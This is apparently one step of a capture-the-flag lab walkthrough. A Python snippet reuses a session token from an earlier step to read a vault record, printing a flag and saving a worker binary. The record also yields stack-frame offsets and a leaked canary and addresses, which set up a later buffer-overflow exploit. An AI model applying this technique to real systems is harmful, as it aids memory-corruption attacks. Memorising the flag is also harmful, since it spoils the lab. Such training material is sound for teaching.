# W31.1 Walkthrough: The vault's misleading length

Read the diagnostic vault record and keep the worker binary. The read returns the
flag and the DVL1 worker for the W31.2-W31.4 steps.

Prerequisite: `receipts/process-session` from the W09.4 chain.

## Step 1: read the vault record (W31.1 acceptance check)

```python
import json, ssl, urllib.request, pathlib, base64
ctx = ssl.create_default_context(cafile="/tmp/arwc-ca-bundle.pem")
ps = pathlib.Path("receipts/process-session").read_text().strip()
H = {"Authorization": "Bearer " + ps, "X-ARWC-Tenant": "arwc"}
d = json.loads(urllib.request.urlopen(
    urllib.request.Request("https://process-view.arwc.test/api/vault-records/current", headers=H),
    context=ctx).read())
print("flag:", d["flag"])
pathlib.Path("/tmp/dvl-worker").write_bytes(base64.b64decode(d["worker_b64"]))
print("frame:", d["record"]["frame"])
print("status:", d["record"]["status"])
```

Output `flag: FLAG{57aedcb6774e1e4d}`. The record gives the DVL1 frame
(`workspace_bytes=288`, `canary_offset=288`, `saved_rbp_offset=296`,
`return_state_offset=304`, `argument_offset=312`) and the status
(`stack_canary`, `status_address`, `worker_mapping.base`). Keep these for W31.2-W31.4.
